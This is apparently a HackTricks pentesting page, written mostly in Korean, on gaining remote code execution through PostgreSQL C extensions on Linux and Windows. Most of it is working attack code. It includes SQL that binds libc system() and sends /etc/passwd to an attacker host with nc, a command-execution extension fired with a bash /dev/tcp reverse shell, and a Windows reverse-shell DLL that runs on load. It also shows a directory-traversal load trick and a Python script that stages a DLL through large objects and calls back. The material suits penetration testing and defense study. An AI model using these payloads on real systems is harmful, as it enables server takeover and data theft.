# RCE with PostgreSQL Extensions

{{#include ../../../banners/hacktricks-training.md}}

## PostgreSQL Extensions

PostgreSQL는 확장성을 핵심 기능으로 개발하여, 확장을 마치 내장 기능처럼 원활하게 통합할 수 있습니다. 이러한 확장은 본질적으로 C로 작성된 라이브러리로, 데이터베이스에 추가 기능, 연산자 또는 유형을 풍부하게 합니다.

8.1 버전부터는 확장 라이브러리에 특정 요구 사항이 부과됩니다: 특별한 헤더로 컴파일되어야 합니다. 그렇지 않으면 PostgreSQL은 이를 실행하지 않으며, 호환 가능하고 잠재적으로 안전한 확장만 사용되도록 보장합니다.

또한, **PostgreSQL을 악용하여 피해자에게 파일을 업로드하는 방법을 모른다면 이 게시물을 읽어야 합니다.** [**upload files to the victim abusing PostgreSQL you should read this post.**](big-binary-files-upload-postgresql.md)

### RCE in Linux

**자세한 정보는 다음을 확인하세요: [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)**

PostgreSQL 8.1 및 이전 버전에서 시스템 명령을 실행하는 것은 명확하게 문서화되어 있으며 간단한 프로세스입니다. 이를 사용하여 다음을 사용할 수 있습니다: [Metasploit module](https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload).
```sql
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');

# You can also create functions to open and write files
CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION close(int) RETURNS int AS '/lib/libc.so.6', 'close' LANGUAGE 'C' STRICT;
```
<details>

<summary>base64로 이진 파일 쓰기</summary>

Postgres에서 파일에 이진 데이터를 쓰려면 base64를 사용해야 할 수 있습니다. 이는 이 문제에 도움이 될 것입니다:
```sql
CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS
$$
DECLARE
fh int;
s int;
w bytea;
i int;
BEGIN
SELECT open(textout(file)::cstring, 522, 448) INTO fh;

IF fh <= 2 THEN
RETURN 1;
END IF;

SELECT decode(s, 'base64') INTO w;

i := 0;
LOOP
EXIT WHEN i >= octet_length(w);

SELECT write(fh,textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;

IF rs < 0 THEN
RETURN 2;
END IF;

i := i + 1;
END LOOP;

SELECT close(fh) INTO rs;

RETURN 0;

END;
$$ LANGUAGE 'plpgsql';
```
</details>

그러나 더 높은 버전에서 시도했을 때 **다음 오류가 표시되었습니다**:
```c
ERROR:  incompatible library “/lib/x86_64-linux-gnu/libc.so.6”: missing magic block
HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro.
```
이 오류는 [PostgreSQL 문서](https://www.postgresql.org/docs/current/static/xfunc-c.html)에서 설명되어 있습니다:

> 동적으로 로드된 객체 파일이 호환되지 않는 서버에 로드되지 않도록 하기 위해, PostgreSQL은 파일에 적절한 내용이 포함된 "매직 블록"이 있는지 확인합니다. 이를 통해 서버는 PostgreSQL의 다른 주요 버전용으로 컴파일된 코드와 같은 명백한 호환성 문제를 감지할 수 있습니다. PostgreSQL 8.2부터 매직 블록이 필요합니다. 매직 블록을 포함하려면, 헤더 fmgr.h를 포함한 후 모듈 소스 파일 중 하나(그리고 단 하나)에 다음을 작성하십시오:
>
> `#ifdef PG_MODULE_MAGIC`\
> `PG_MODULE_MAGIC;`\
> `#endif`

PostgreSQL 8.2 버전 이후로 공격자가 시스템을 악용하는 과정이 더 어려워졌습니다. 공격자는 시스템에 이미 존재하는 라이브러리를 사용하거나 사용자 정의 라이브러리를 업로드해야 합니다. 이 사용자 정의 라이브러리는 호환 가능한 주요 버전의 PostgreSQL에 대해 컴파일되어야 하며 특정 "매직 블록"을 포함해야 합니다. 이 조치는 PostgreSQL 시스템을 악용하는 난이도를 크게 증가시키며, 시스템의 아키텍처와 버전 호환성에 대한 더 깊은 이해가 필요합니다.

#### 라이브러리 컴파일

다음 명령어로 PostgreSQL 버전을 가져옵니다:
```sql
SELECT version();
PostgreSQL 9.6.3 on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18) 6.3.0 20170516, 64-bit
```
호환성을 위해 주요 버전이 일치하는 것이 필수적입니다. 따라서 9.6.x 시리즈 내의 어떤 버전으로 라이브러리를 컴파일하더라도 성공적인 통합을 보장해야 합니다.

해당 버전을 시스템에 설치하려면:
```bash
apt install postgresql postgresql-server-dev-9.6
```
라이브러리를 컴파일합니다:
```c
//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
char* command = PG_GETARG_CSTRING(0);
PG_RETURN_INT32(system(command));
}
```
그런 다음 컴파일된 라이브러리를 업로드하고 다음과 같이 명령을 실행합니다:
```bash
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
#Notice the double single quotes are needed to scape the qoutes
```
이 **라이브러리는 미리 컴파일된** 여러 PostgreSQL 버전에서 찾을 수 있으며, **이 프로세스를 자동화할 수 있습니다** (PostgreSQL 접근 권한이 있는 경우) 다음과 함께:

{{#ref}}
https://github.com/Dionach/pgexec
{{#endref}}

### Windows에서 RCE

다음 DLL은 **이진 파일의 이름**과 **실행할 횟수**를 입력으로 받아 실행합니다:
```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

/* retrieve the second argument that is passed to the function (an integer)
that will serve as our counter limit*/

int instances = PG_GETARG_INT32(1);

for (int c = 0; c < instances; c++) {
/*launch the process passed in the first parameter*/
ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
}
PG_RETURN_VOID();
}
```
이 ZIP 파일에서 컴파일된 DLL을 찾을 수 있습니다:

{% file src="../../../images/pgsql_exec.zip" %}

이 DLL에 **실행할 바이너리**와 실행할 횟수를 지정할 수 있습니다. 이 예제에서는 `calc.exe`를 2번 실행합니다:
```bash
CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);
```
[**여기** ](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html)에서 이 리버스 셸을 찾을 수 있습니다:
```c
#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <winsock2.h>

#pragma comment(lib,"ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL,
_In_ DWORD fdwReason,
_In_ LPVOID lpvReserved)
{
WSADATA wsaData;
SOCKET wsock;
struct sockaddr_in server;
char ip_addr[16];
STARTUPINFOA startupinfo;
PROCESS_INFORMATION processinfo;

char *program = "cmd.exe";
const char *ip = PG_REVSHELL_CALLHOME_SERVER;
u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);

WSAStartup(MAKEWORD(2, 2), &wsaData);
wsock = WSASocket(AF_INET, SOCK_STREAM,
IPPROTO_TCP, NULL, 0, 0);

struct hostent *host;
host = gethostbyname(ip);
strcpy_s(ip_addr, sizeof(ip_addr),
inet_ntoa(*((struct in_addr *)host->h_addr)));

server.sin_family = AF_INET;
server.sin_port = htons(port);
server.sin_addr.s_addr = inet_addr(ip_addr);

WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
NULL, NULL, NULL, NULL);

memset(&startupinfo, 0, sizeof(startupinfo));
startupinfo.cb = sizeof(startupinfo);
startupinfo.dwFlags = STARTF_USESTDHANDLES;
startupinfo.hStdInput = startupinfo.hStdOutput =
startupinfo.hStdError = (HANDLE)wsock;

CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
NULL, NULL, &startupinfo, &processinfo);

return TRUE;
}

#pragma warning(pop) /* re-enable 4996 */

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);

PG_FUNCTION_INFO_V1(add_one);

Datum dummy_function(PG_FUNCTION_ARGS)
{
int32 arg = PG_GETARG_INT32(0);

PG_RETURN_INT32(arg + 1);
}
```
이 경우 **악성 코드가 DllMain 함수 안에 있습니다**. 이는 이 경우 postgresql에서 로드된 함수를 실행할 필요가 없으며, 단지 **DLL을 로드하는 것만으로** 리버스 셸이 **실행됩니다**:
```c
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
```
[PolyUDF 프로젝트](https://github.com/rop-la/PolyUDF)는 전체 MS Visual Studio 프로젝트와 사용 준비가 완료된 라이브러리(_command eval_, _exec_ 및 _cleanup_ 포함)와 다중 버전 지원이 있어 좋은 출발점입니다.

### 최신 PostgreSQL 버전에서의 RCE

**최신 버전**의 PostgreSQL에서는 `superuser`가 특정 디렉토리(예: Windows의 `C:\Program Files\PostgreSQL\11\lib` 또는 \*nix 시스템의 `/var/lib/postgresql/11/lib`)에서만 공유 라이브러리 파일을 **로드**하는 것이 **금지**되었습니다. 이러한 디렉토리는 NETWORK_SERVICE 또는 postgres 계정에 의해 쓰기 작업이 **보호**됩니다.

이러한 제한에도 불구하고 인증된 데이터베이스 `superuser`는 "대용량 객체"를 사용하여 파일 시스템에 **바이너리 파일**을 **쓰기**할 수 있습니다. 이 기능은 데이터베이스 작업(예: 테이블 업데이트 또는 생성)에 필수적인 `C:\Program Files\PostgreSQL\11\data` 디렉토리 내에서의 쓰기로 확장됩니다.

중요한 취약점은 `CREATE FUNCTION` 명령에서 발생하며, 이는 데이터 디렉토리로의 **디렉토리 탐색**을 **허용**합니다. 따라서 인증된 공격자는 이 탐색을 **악용**하여 데이터 디렉토리에 공유 라이브러리 파일을 작성한 다음 **로드**할 수 있습니다. 이 익스플로잇은 공격자가 임의의 코드를 실행할 수 있게 하여 시스템에서 네이티브 코드 실행을 달성하게 합니다.

#### 공격 흐름

먼저 **대용량 객체를 사용하여 dll을 업로드**해야 합니다. 이를 수행하는 방법은 여기에서 확인할 수 있습니다:

{{#ref}}
big-binary-files-upload-postgresql.md
{{#endref}}

데이터 디렉토리에 확장자(poc.dll이라는 이름으로 이 예제에서)를 업로드한 후 다음과 같이 로드할 수 있습니다:
```c
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
```
_확장자를 `.dll`로 추가할 필요는 없습니다. create 함수가 이를 추가할 것입니다._

자세한 정보는 **[원본 게시물을 여기에서 읽어보세요](https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html)**.\
해당 게시물에서는 **postgres 확장을 생성하는 데 사용된** [**코드**](https://github.com/sourceincite/tools/blob/master/pgpwn.c) (_postgres 확장을 컴파일하는 방법을 배우려면 이전 버전 중 하나를 읽어보세요_)가 제공되었습니다.\
같은 페이지에서 이 **기술을 자동화하는** **익스플로잇**이 제공되었습니다:
```python
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
print("(+) usage %s <connectback> <port> <dll/so>" % sys.argv[0])
print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
start = i * 2048
end   = (i+1) * 2048
if i == 0:
sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
else:
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
end   = (i+1) * 2048
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```
## 참고문헌

- [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
- [https://www.exploit-db.com/papers/13084](https://www.exploit-db.com/papers/13084)

{{#include ../../../banners/hacktricks-training.md}}
